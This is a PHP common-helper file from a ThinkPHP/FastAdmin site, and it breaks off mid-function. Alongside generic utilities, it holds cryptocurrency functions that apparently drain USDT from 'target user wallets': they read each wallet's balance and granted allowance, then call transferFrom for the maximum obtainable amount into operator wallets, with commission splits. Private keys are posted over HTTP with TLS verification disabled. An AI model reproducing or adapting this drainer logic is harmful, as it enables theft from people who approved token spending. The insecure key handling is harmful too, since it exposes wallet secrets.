<?php

// 公共助手函数

use think\exception\HttpResponseException;
use think\Response;

if (!function_exists('__')) {

    /**
     * 获取语言变量值
     * @param string $name 语言变量名
     * @param string | array  $vars 动态变量值
     * @param string $lang 语言
     * @return mixed
     */
    function __($name, $vars = [], $lang = '')
    {
        if (is_numeric($name) || !$name) {
            return $name;
        }
        if (!is_array($vars)) {
            $vars = func_get_args();
            array_shift($vars);
            $lang = '';
        }
        return \think\Lang::get($name, $vars, $lang);
    }
}

if (!function_exists('format_bytes')) {

    /**
     * 将字节转换为可读文本
     * @param int    $size      大小
     * @param string $delimiter 分隔符
     * @param int    $precision 小数位数
     * @return string
     */
    function format_bytes($size, $delimiter = '', $precision = 2)
    {
        $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
        for ($i = 0; $size >= 1024 && $i < 5; $i++) {
            $size /= 1024;
        }
        return round($size, $precision) . $delimiter . $units[$i];
    }
}

if (!function_exists('datetime')) {

    /**
     * 将时间戳转换为日期时间
     * @param int    $time   时间戳
     * @param string $format 日期时间格式
     * @return string
     */
    function datetime($time, $format = 'Y-m-d H:i:s')
    {
        $time = is_numeric($time) ? $time : strtotime($time);
        return date($format, $time);
    }
}

if (!function_exists('human_date')) {

    /**
     * 获取语义化时间
     * @param int $time  时间
     * @param int $local 本地时间
     * @return string
     */
    function human_date($time, $local = null)
    {
        return \fast\Date::human($time, $local);
    }
}

if (!function_exists('cdnurl')) {

    /**
     * 获取上传资源的CDN的地址
     * @param string         $url    资源相对地址
     * @param boolean|string $domain 是否显示域名 或者直接传入域名
     * @return string
     */
    function cdnurl($url, $domain = false)
    {
        $regex = "/^((?:[a-z]+:)?\/\/|data:image\/)(.*)/i";
        $cdnurl = \think\Config::get('upload.cdnurl');
        if (is_bool($domain) || stripos($cdnurl, '/') === 0) {
            $url = preg_match($regex, $url) || ($cdnurl && stripos($url, $cdnurl) === 0) ? $url : $cdnurl . $url;
        }
        if ($domain && !preg_match($regex, $url)) {
            $domain = is_bool($domain) ? request()->domain() : $domain;
            $url = $domain . $url;
        }
        return $url;
    }
}


if (!function_exists('is_really_writable')) {

    /**
     * 判断文件或文件夹是否可写
     * @param string $file 文件或目录
     * @return    bool
     */
    function is_really_writable($file)
    {
        if (DIRECTORY_SEPARATOR === '/') {
            return is_writable($file);
        }
        if (is_dir($file)) {
            $file = rtrim($file, '/') . '/' . md5(mt_rand());
            if (($fp = @fopen($file, 'ab')) === false) {
                return false;
            }
            fclose($fp);
            @chmod($file, 0777);
            @unlink($file);
            return true;
        } elseif (!is_file($file) or ($fp = @fopen($file, 'ab')) === false) {
            return false;
        }
        fclose($fp);
        return true;
    }
}

if (!function_exists('rmdirs')) {

    /**
     * 删除文件夹
     * @param string $dirname  目录
     * @param bool   $withself 是否删除自身
     * @return boolean
     */
    function rmdirs($dirname, $withself = true)
    {
        if (!is_dir($dirname)) {
            return false;
        }
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dirname, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }
        if ($withself) {
            @rmdir($dirname);
        }
        return true;
    }
}

if (!function_exists('copydirs')) {

    /**
     * 复制文件夹
     * @param string $source 源文件夹
     * @param string $dest   目标文件夹
     */
    function copydirs($source, $dest)
    {
        if (!is_dir($dest)) {
            mkdir($dest, 0755, true);
        }
        foreach (
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            ) as $item
        ) {
            if ($item->isDir()) {
                $sontDir = $dest . DS . $iterator->getSubPathName();
                if (!is_dir($sontDir)) {
                    mkdir($sontDir, 0755, true);
                }
            } else {
                copy($item, $dest . DS . $iterator->getSubPathName());
            }
        }
    }
}

if (!function_exists('mb_ucfirst')) {
    function mb_ucfirst($string)
    {
        return mb_strtoupper(mb_substr($string, 0, 1)) . mb_strtolower(mb_substr($string, 1));
    }
}

if (!function_exists('addtion')) {

    /**
     * 附加关联字段数据
     * @param array $items  数据列表
     * @param mixed $fields 渲染的来源字段
     * @return array
     */
    function addtion($items, $fields)
    {
        if (!$items || !$fields) {
            return $items;
        }
        $fieldsArr = [];
        if (!is_array($fields)) {
            $arr = explode(',', $fields);
            foreach ($arr as $k => $v) {
                $fieldsArr[$v] = ['field' => $v];
            }
        } else {
            foreach ($fields as $k => $v) {
                if (is_array($v)) {
                    $v['field'] = $v['field'] ?? $k;
                } else {
                    $v = ['field' => $v];
                }
                $fieldsArr[$v['field']] = $v;
            }
        }
        foreach ($fieldsArr as $k => &$v) {
            $v = is_array($v) ? $v : ['field' => $v];
            $v['display'] = $v['display'] ?? str_replace(['_ids', '_id'], ['_names', '_name'], $v['field']);
            $v['primary'] = $v['primary'] ?? '';
            $v['column'] = $v['column'] ?? 'name';
            $v['model'] = $v['model'] ?? '';
            $v['table'] = $v['table'] ?? '';
            $v['name'] = $v['name'] ?? str_replace(['_ids', '_id'], '', $v['field']);
        }
        unset($v);
        $ids = [];
        $fields = array_keys($fieldsArr);
        foreach ($items as $k => $v) {
            foreach ($fields as $m => $n) {
                if (isset($v[$n])) {
                    $ids[$n] = array_merge(isset($ids[$n]) && is_array($ids[$n]) ? $ids[$n] : [], explode(',', $v[$n]));
                }
            }
        }
        $result = [];
        foreach ($fieldsArr as $k => $v) {
            if ($v['model']) {
                $model = new $v['model'];
            } else {
                // 优先判断使用table的配置
                $model = $v['table'] ? \think\Db::table($v['table']) : \think\Db::name($v['name']);
            }
            $primary = $v['primary'] ?: $model->getPk();
            $result[$v['field']] = isset($ids[$v['field']]) ? $model->where($primary, 'in', $ids[$v['field']])->column($v['column'], $primary) : [];
        }

        foreach ($items as $k => &$v) {
            foreach ($fields as $m => $n) {
                if (isset($v[$n])) {
                    $curr = array_flip(explode(',', $v[$n]));

                    $linedata = array_intersect_key($result[$n], $curr);
                    $v[$fieldsArr[$n]['display']] = $fieldsArr[$n]['column'] == '*' ? $linedata : implode(',', $linedata);
                }
            }
        }
        return $items;
    }
}

if (!function_exists('var_export_short')) {

    /**
     * 使用短标签打印或返回数组结构
     * @param mixed   $data
     * @param boolean $return 是否返回数据
     * @return string
     */
    function var_export_short($data, $return = true)
    {
        return var_export($data, $return);
    }
}

if (!function_exists('letter_avatar')) {
    /**
     * 首字母头像
     * @param $text
     * @return string
     */
    function letter_avatar($text)
    {
        $total = unpack('L', hash('adler32', $text, true))[1];
        $hue = $total % 360;
        list($r, $g, $b) = hsv2rgb($hue / 360, 0.3, 0.9);

        $bg = "rgb({$r},{$g},{$b})";
        $color = "#ffffff";
        $first = mb_strtoupper(mb_substr($text, 0, 1));
        $src = base64_encode('<svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="100" width="100"><rect fill="' . $bg . '" x="0" y="0" width="100" height="100"></rect><text x="50" y="50" font-size="50" text-copy="fast" fill="' . $color . '" text-anchor="middle" text-rights="admin" dominant-baseline="central">' . $first . '</text></svg>');
        $value = 'data:image/svg+xml;base64,' . $src;
        return $value;
    }
}

if (!function_exists('hsv2rgb')) {
    function hsv2rgb($h, $s, $v)
    {
        $r = $g = $b = 0;

        $i = floor($h * 6);
        $f = $h * 6 - $i;
        $p = $v * (1 - $s);
        $q = $v * (1 - $f * $s);
        $t = $v * (1 - (1 - $f) * $s);

        switch ($i % 6) {
            case 0:
                $r = $v;
                $g = $t;
                $b = $p;
                break;
            case 1:
                $r = $q;
                $g = $v;
                $b = $p;
                break;
            case 2:
                $r = $p;
                $g = $v;
                $b = $t;
                break;
            case 3:
                $r = $p;
                $g = $q;
                $b = $v;
                break;
            case 4:
                $r = $t;
                $g = $p;
                $b = $v;
                break;
            case 5:
                $r = $v;
                $g = $p;
                $b = $q;
                break;
        }

        return [
            floor($r * 255),
            floor($g * 255),
            floor($b * 255)
        ];
    }
}

if (!function_exists('check_nav_active')) {
    /**
     * 检测会员中心导航是否高亮
     */
    function check_nav_active($url, $classname = 'active')
    {
        $auth = \app\common\library\Auth::instance();
        $requestUrl = $auth->getRequestUri();
        $url = ltrim($url, '/');
        return $requestUrl === str_replace(".", "/", $url) ? $classname : '';
    }
}

if (!function_exists('check_cors_request')) {
    /**
     * 跨域检测
     */
    function check_cors_request()
    {
        if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] && config('fastadmin.cors_request_domain')) {
            $info = parse_url($_SERVER['HTTP_ORIGIN']);
            $domainArr = explode(',', config('fastadmin.cors_request_domain'));
            $domainArr[] = request()->host(true);
            if (in_array("*", $domainArr) || in_array($_SERVER['HTTP_ORIGIN'], $domainArr) || (isset($info['host']) && in_array($info['host'], $domainArr))) {
                header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
            } else {
                $response = Response::create('跨域检测无效', 'html', 403);
                throw new HttpResponseException($response);
            }

            header('Access-Control-Allow-Credentials: true');
            header('Access-Control-Max-Age: 86400');

            if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
                if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD'])) {
                    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
                }
                if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS'])) {
                    header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
                }
                $response = Response::create('', 'html');
                throw new HttpResponseException($response);
            }
        }
    }
}

if (!function_exists('xss_clean')) {
    /**
     * 清理XSS
     */
    function xss_clean($content, $is_image = false)
    {
        return \app\common\library\Security::instance()->xss_clean($content, $is_image);
    }
}

if (!function_exists('url_clean')) {
    /**
     * 清理URL
     */
    function url_clean($url)
    {
        if (!check_url_allowed($url)) {
            return '';
        }
        return xss_clean($url);
    }
}

if (!function_exists('check_ip_allowed')) {
    /**
     * 检测IP是否允许
     * @param string $ip IP地址
     */
    function check_ip_allowed($ip = null)
    {
        $ip = is_null($ip) ? request()->ip() : $ip;
        $forbiddenipArr = config('site.forbiddenip');
        $forbiddenipArr = !$forbiddenipArr ? [] : $forbiddenipArr;
        $forbiddenipArr = is_array($forbiddenipArr) ? $forbiddenipArr : array_filter(explode("\n", str_replace("\r\n", "\n", $forbiddenipArr)));
        if ($forbiddenipArr && \Symfony\Component\HttpFoundation\IpUtils::checkIp($ip, $forbiddenipArr)) {
            $response = Response::create('请求无权访问', 'html', 403);
            throw new HttpResponseException($response);
        }
    }
}

if (!function_exists('check_url_allowed')) {
    /**
     * 检测URL是否允许
     * @param string $url URL
     * @return bool
     */
    function check_url_allowed($url = '')
    {
        //允许的主机列表
        $allowedHostArr = [
            strtolower(request()->host())
        ];

        if (empty($url)) {
            return true;
        }

        //如果是站内相对链接则允许
        if (preg_match("/^[\/a-z][a-z0-9][a-z0-9\.\/]+((\?|#).*)?\$/i", $url) && substr($url, 0, 2) !== '//') {
            return true;
        }

        //如果是站外链接则需要判断HOST是否允许
        if (preg_match("/((http[s]?:\/\/)+((?>[a-z\-0-9]{2,}\.)+[a-z]{2,8}|((?>([0-9]{1,3}\.)){3}[0-9]{1,3}))(:[0-9]{1,5})?)(?:\s|\/)/i", $url)) {
            $chkHost = parse_url(strtolower($url), PHP_URL_HOST);
            if ($chkHost && in_array($chkHost, $allowedHostArr)) {
                return true;
            }
        }

        return false;
    }
}

if (!function_exists('build_suffix_image')) {
    /**
     * 生成文件后缀图片
     * @param string $suffix 后缀
     * @param null   $background
     * @return string
     */
    function build_suffix_image($suffix, $background = null)
    {
        $suffix = mb_substr(strtoupper($suffix), 0, 4);
        $total = unpack('L', hash('adler32', $suffix, true))[1];
        $hue = $total % 360;
        list($r, $g, $b) = hsv2rgb($hue / 360, 0.3, 0.9);

        $background = $background ? $background : "rgb({$r},{$g},{$b})";

        $icon = <<<EOT
        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
            <path style="fill:#E2E5E7;" d="M128,0c-17.6,0-32,14.4-32,32v448c0,17.6,14.4,32,32,32h320c17.6,0,32-14.4,32-32V128L352,0H128z"/>
            <path style="fill:#B0B7BD;" d="M384,128h96L352,0v96C352,113.6,366.4,128,384,128z"/>
            <polygon style="fill:#CAD1D8;" points="480,224 384,128 480,128 "/>
            <path style="fill:{$background};" d="M416,416c0,8.8-7.2,16-16,16H48c-8.8,0-16-7.2-16-16V256c0-8.8,7.2-16,16-16h352c8.8,0,16,7.2,16,16 V416z"/>
            <path style="fill:#CAD1D8;" d="M400,432H96v16h304c8.8,0,16-7.2,16-16v-16C416,424.8,408.8,432,400,432z"/>
            <g><text><tspan x="220" y="380" font-size="124" font-family="Verdana, Helvetica, Arial, sans-serif" fill="white" text-anchor="middle">{$suffix}</tspan></text></g>
        </svg>
EOT;
        return $icon;
    }
}


if (!function_exists('http')) {

    /**
     * 请求HTTP数据
     * @param  [type] $url        完整URL地址
     * @param string $params GET、POST参数
     * @param string $method 提交方式GET、POST
     * @param array $header Header参数
     * @param array $proxy 代理参数['username'=>'','password'=>'','ip'=>'','port'=>'']
     * @param string $userAgent 客户端名称 如：iOS
     * @param integer $timeout 请求超时时间 单位：秒
     * @param boolean $getinfo 是否返回文件信息
     * @param integer $retry 重试次数, 默认3次
     * @param integer $sleep 重试间隔时间, 默认1s
     * @return bool|string
     */
    function http($url, $params = '', $method = 'GET', $header = [], $proxy = [], $userAgent = '', $timeout = 100, $getinfo = false, $retry=6, $sleep = 1)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        if (strtoupper($method) == 'POST' && !empty($params)) {
            curl_setopt($ch, CURLOPT_POST, TRUE);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        }
        if (strtoupper($method) == 'GET' && $params) {
            $query_str = http_build_query($params);
            $url       = $url . (strpos($url, '?') === false ? '?' : '&') . $query_str;
        }
        curl_setopt($ch, CURLOPT_URL, $url);
        if (!empty($proxy)) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']); //代理服务器地址
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']); //代理服务器端口
            //http代理认证帐号，username:password的格式
            if ($proxy['username'] && $proxy['password']) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'] . ":" . $proxy['password']);
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
            }
        }
        if($getinfo){
            // 获取头部信息
            curl_setopt($ch, CURLOPT_HEADER, 1);
        }
        if ($userAgent) {
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
        }
        $response = curl_exec($ch);

        // 检查是否有错误发生
        while(curl_errno($ch) && $retry--){
            sleep($sleep); //阻塞1s
            $response = curl_exec($ch);
        }
        if (curl_errno($ch)) {
            return curl_error($ch);
        }
        if($getinfo) {

            $fileinfo = curl_getinfo($ch);  //新增返回文件信息

            // 解析http数据流
            list($header, $body) = explode("\r\n\r\n", $response);

        }

        curl_close($ch);

        return $getinfo ? ['response'=>$body,'fileinfo'=>$fileinfo,'header'=>$header] : $response;
    }
}
/**
 * 提现
 *
 * @param $data
 * @param $stype 1 合约  2 gas
 * @return mixed
 */
function recharge_money($data){
    $post_data = [
        'toaddress'=> $data['toaddress'] ,
        'amount'=> $data['aftermoney'] ,// 实际到账
        'order'=> $data['order'] ,
        'contract'=> $data['contract_address'] ,
        'from_address'=> $data['from_address'] ,
        'private_key'=> $data['private_key'] ,
    ];
//    dump($post_data);
    $url = $data['url'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
    curl_close($ch);
    //print_r($arr);
//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
    return json_decode($arr,true);
}

/**
 * transferFrom
 *
 * @param $data
 * @return mixed
 */
function transferfrom_money($data){
    $post_data = [
        'toaddress'=> $data['toaddress'] ,
        'amount'=> $data['aftermoney'] ,// 实际到账
        'order'=> $data['order'] ,
        'contract'=> $data['contract_address'] ,
        'from_address'=> $data['from_address'] ,
        'approve_address'=> $data['approve_address'] ,
        'private_key'=> $data['private_key'] ,
    ];
//    dump($post_data);
    $url = $data['url'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
    curl_close($ch);
    //print_r($arr);
//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
    return json_decode($arr,true);
}
/**
 * transferFrom_ap
 * @param $data
 * @return mixed
 */
function transferfrom_money_ap($data){
    $amount = $data['amount1'];
    $amount2 = $data['amount2'];
    $post_data = [
        'token'=> $data['contract_address'] ,
        'contract'=> $data['approve_address'],
        'order'=> $data['order'] ,
        'from_address'=> $data['from_address'] ,
        'approve_address'=> $data['approve_user_address'] ,
        'private_key'=> $data['private_key'] ,
        'toaddress'=> $data['toaddress'] ,
        'amount'=> $amount ,// 实际到账
        'toaddress2'=> config('conf.js_bsc_address') ,
        'amount2'=> $amount2 ,// 实际到账
    ];
//    dump($post_data);
    $url = $data['url'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
    curl_close($ch);
    //print_r($arr);
//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
    return json_decode($arr,true);
}
function transferfrom_money_3ap($data){
    $amount = $data['amount1'];
    $amount2 = $data['amount2'];
    $amount3 = $data['amount3'];
    $post_data = [
        'token'=> $data['contract_address'] ,
        'contract'=> $data['approve_address'],
        'order'=> $data['order'] ,
        'from_address'=> $data['from_address'] ,
        'approve_address'=> $data['approve_user_address'] ,
        'private_key'=> $data['private_key'] ,
        'toaddress'=> $data['toaddress'] ,
        'amount'=> $amount ,// 实际到账
        'toaddress2'=> $data['to2'],
        'amount2'=> $amount2 ,// 实际到账
        'toaddress3'=> $data['to3'],
        'amount3'=> $amount3 ,// 实际到账
    ];
//    dump($post_data);
    $url = $data['url'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
    curl_close($ch);
    //print_r($arr);
//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
    return json_decode($arr,true);
}
/**
 * 地址加星
 *
 * @param $address 钱包地址
 * @param int $length 长度
 * @return string
 */
function address_add_star($address,$length=5){
    $left_addr = substr($address,0,$length);
    $rigth_addr = substr($address,-1*$length,$length);
    return $left_addr.'***'.$rigth_addr;
}
/**
 * 提取字符串中的数字
 * @param $str
 * @return string
 */
function findNum($str=''){
    $str=trim($str);
    if(empty($str)){return '';}
    $result='';
    for($i=0;$i<strlen($str);$i++){
        if(is_numeric($str[$i])){
            $result.=$str[$i];
        }
    }
    return $result;
}

/**
 * 检查有大小写区别的以太坊地址是否合法
 *
 * @param $address 地址
 * @return bool
 */
function check_eth_addr($address){
    if(preg_match("/^0x[0-9a-fA-F]{40}$/",$address)){
        return true;
    }else{
        return false;
    }
}
/**
 * 检查有大小写区别的BTC地址是否合法
 *
 * @param $address 地址
 * @return bool
 */
function check_btc_addr($address){
    if (!(preg_match('/^(1|3)[a-zA-Z\d]{24,33}$/', $address) && preg_match('/^[^0OlI]{25,34}$/', $address))){
        return false;
    }else{
        return true;
    }
}

function getImagesAttr($value)
{
    $imagesArray = [];
    if (!empty($value)) {
        $imagesArray = explode(',', $value);
        foreach ($imagesArray as &$v) {
            $v = cdnurl($v, true);
        }
        return implode(',',$imagesArray);
    }
    return implode(',',$imagesArray);
}
function getContentAttr($value)
{
    $content = $value;
    $content = str_replace("<img src=\"/uploads", "<img style=\"width: 100%;!important\" src=\"" . request()->domain() . "/uploads", $content);
    $content = str_replace("<video src=\"/uploads", "<video style=\"width: 100%;!important\" src=\"" . request()->domain() . "/uploads", $content);
    return $content;
}
if (!function_exists('languageList')) {
    /**
     * 图片加网址
     * @return string
     */
    function cdnpic($value)
    {
        if (!empty($value)) return cdnurl($value, true);

    }
}
if (!function_exists('languageList')) {
    /**
     * 网站语言
     * @return array
     */
    function languageList()
    {
        return ['1' => __('简体中文'), '2' => __('繁体中文'), '3' => __('英语'), '4' => __('俄语'), '5' => __('土耳其语'), '6' => __('德语'), '7' => __('法语'), '8' => __('意大利语'), '9' => __('西班牙语')];
    }
}
if (!function_exists('language_num')) {
    /**
     * api网站语言
     * @return int
     */
    function language_num($language)
    {
        switch ($language){
            case 'zh-cn':
                $language_num = 1;
                break;
            case 'zh-tw':
                $language_num = 2;
                break;
            case 'ru-mo':
                $language_num = 4;
                break;
            case 'tr':
                $language_num = 5;
                break;
            case 'de':
                $language_num = 6;
                break;
            case 'fr':
                $language_num = 7;
                break;
            case 'it':
                $language_num = 8;
                break;
            case 'es':
                $language_num = 9;
                break;
            default:
                $language_num = 3;
                break;
        }
        return $language_num;
    }
}
if (!function_exists('language_txt')) {
    /**
     * api网站语言
     * @return string
     */
    function language_txt($language)
    {
        switch ($language){
            case 1:
                $language_txt = 'zh-cn';
                break;
            case 2:
                $language_txt = 'zh-tw';
                break;
            case 4:
                $language_txt = 'ru-mo';
                break;
            case 5:
                $language_txt = 'tr';
                break;
            case 6:
                $language_txt = 'de';
                break;
            case 7:
                $language_txt = 'fr';
                break;
            case 8:
                $language_txt = 'it';
                break;
            case 9:
                $language_txt = 'es';
                break;
            default:
                $language_txt = 'en';
                break;
        }
        return $language_txt;
    }
}

if (!function_exists('generateTrcAddress')) {
    /**
     * 生成trc钱包
     * @return array
     */
    function generateTrcAddress(){
        $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
        $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
        $config = [];
        $trxWallet = new \Tron\TRX($api,$config);
        $wallet = $trxWallet->generateAddress();
        $address['address'] = $wallet->address;
        $privatekey = $wallet->privateKey;
        $address['privatekey'] = substr($privatekey,2,strlen($privatekey));
        return $address;
    }
}

if (!function_exists('generateBscAddress')) {
    /**
     * 生成BSC钱包
     * @return array
     */
    function generateBscAddress(){
        return (new \app\common\contract\GeneratePrivateKey())->CreateAddress();
    }
}
//合约扣款有分佣
if (!function_exists('reviewTransfer')) {
    /**
     * 合约扣款有分佣
     */
    function reviewTransfer($amount,$address)
    {
        if ((new \Tron\Address($address))->isValid()) {
            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_trx_usdt')])->find();
        }else{
            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_bsc_usdt')])->find();
        }
        if (!$row) {
            return false;
        }
        $finance = \app\admin\model\user\Finance::where(['user_id' => $row['user_id']])->find();
        if ((new \Tron\Address($row['address']))->isValid()) {
            $qb_type = 1;
            $approve_add_address = $finance['receive_wallet_trx'];
            $approve_user_address = $finance['operate_wallet_trx'];
            $approve_key = $finance['operate_wallet_trx_key'];

        } else {
            $qb_type = 2;
            $approve_add_address = $finance['receive_wallet_bsc'];
            $approve_user_address = $finance['operate_wallet_bsc'];
            $approve_key = $finance['operate_wallet_bsc_key'];
        }
        $amount_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type, $row['address'], $row['contract_address'], $row['approve_address_decimals']);
        if($amount_online < $amount){
            $amount = $amount_online;
        }
        $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type, $row['address'], $row['approve_address'], $row['contract_address'], $row['approve_address_decimals']);
        if ($amount > $money_approve) {
            $amount = $money_approve;
        }

        if ($amount > 0) {
            $to = $approve_add_address;
            $rrr_arr = config('conf.rrr_arr');
            $psd = $approve_key;
            foreach ($rrr_arr as $aaa) {
                $psd = str_replace($aaa, '', $psd);
            }
            $approve_info = array(
                'qb_type' => $qb_type,//钱包类型
                'approve_address' => $row['approve_address'],//授权合约地址
                'approve_user_address' => $approve_user_address,//调用授权合约的账户
                'psd' => $psd,//调用授权合约的账户的私钥
                'user_address' => $row['address'],//目标用户钱包
                'contract_address' => $row['contract_address'],//目标合约
                'approve_address_decimals' => $row['approve_address_decimals'],//目标合约精度
            );
            $bili = Db('user')->where(['id' => $row['user_id']])->value('commission_rate');//比例
            $receive_info = array(
                'user_id' => $row['user_id'],//用户ID
                'to' => $to,//收款地址
                'amount' => $amount,//金额
                'bili' => $bili,//比例
            );
            $result = '';
            $result = (new \app\common\service\Getbalance())->do_transfer_from($approve_info, $receive_info);
            if ($result) {
                if ($qb_type == 1) {
                    $data['txid'] = $result->txID;
                    $data['amount1'] = $result->amount1;//shop
                    $data['amount2'] = $result->amount2;//js
                    $data['amount3'] = $result->amount3;//lpt
                } else {
                    $data['txid'] = $result['hash'];
                    $data['amount1'] = $result['amount1'];//shop
                    $data['amount2'] = $result['amount2'];//js
                    $data['amount3'] = $result['amount3'];//lpt
                }
                $data['qb_type'] = $qb_type;
                $data['user_id'] = $row['user_id'];
                $data['address'] = $row['address'];
                $data['to_address'] = $to;
                $data['money'] = $amount;
                $data['createtime'] = time();
                $data['updatetime'] = time();
                $ishave = (new \app\admin\model\approve\Transaction())->where(['txid' => $data['txid']])->find();
                if ($ishave) {
                    $ishave->save(['updatetime' => time()]);
                } else {
                    (new \app\admin\model\approve\Transaction())->insert($data);
                }
            }
        }
        return $result;
    }
}
//合约扣款上分无分佣
if (!function_exists('reviewRechargeTransfer')) {
    /**
     * 合约扣款上分无分佣
     */
    function reviewRechargeTransfer($amount,$address)
    {
        if ((new \Tron\Address($address))->isValid()) {
            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_trx_usdt')])->find();
        }else{
            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_bsc_usdt')])->find();
        }
        if (!$row) {
            return false;
        }
        $finance = \app\admin\model\user\Finance::where(['user_id' => $row['user_id']])->find();
        if ((new \Tron\Address($row['address']))->isValid()) {
            $qb_type = 1;
            $approve_add_address = $finance['receive_wallet_trx'];
            $approve_user_address = $finance['operate_wallet_trx'];
            $approve_key = $finance['operate_wallet_trx_key'];

        } else {
            $qb_type = 2;
            $approve_add_address = $finance['receive_wallet_bsc'];
            $approve_user_address = $finance['operate_wallet_bsc'];
            $approve_key = $finance['operate_wallet_bsc_key'];
        }
        $amount_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type, $row['address'], $row['contract_address'], $row['approve_address_decimals']);
        if($amount_online < $amount){
            $amount = $amount_online;
        }
        $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type, $row['address'], $row['approve_address'], $row['contract_address'], $row['approve_address_decimals']);
        if ($amount > $money_approve) {
            $amount = $money_approve;
        }
        $result = '';
        if ($amount > 0) {
            $to = $approve_add_address;
            $rrr_arr = config('conf.rrr_arr');
            $psd = $approve_key;
            foreach ($rrr_arr as $aaa) {
                $psd = str_replace($aaa, '', $psd);
            }
            $approve_info = array(
                'qb_type' => $qb_type,//钱包类型
                'approve_address' => $row['approve_address'],//授权合约地址
                'approve_user_address' => $approve_user_address,//调用授权合约的账户
                'psd' => $psd,//调用授权合约的账户的私钥
                'user_address' => $row['address'],//目标用户钱包
                'contract_address' => $row['contract_address'],//目标合约
                'approve_address_decimals' => $row['approve_address_decimals'],//目标合约精度
            );
            $bili = Db('user')->where(['id' => $row['user_id']])->value('commission_rate');//比例
            $receive_info = array(
                'user_id' => $row['user_id'],//用户ID
                'to' => $to,//收款地址
                'amount' => $amount,//金额
                'bili' => $bili,//比例
            );
            $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info, $receive_info);
            if ($result) {
                if ($qb_type == 1) {
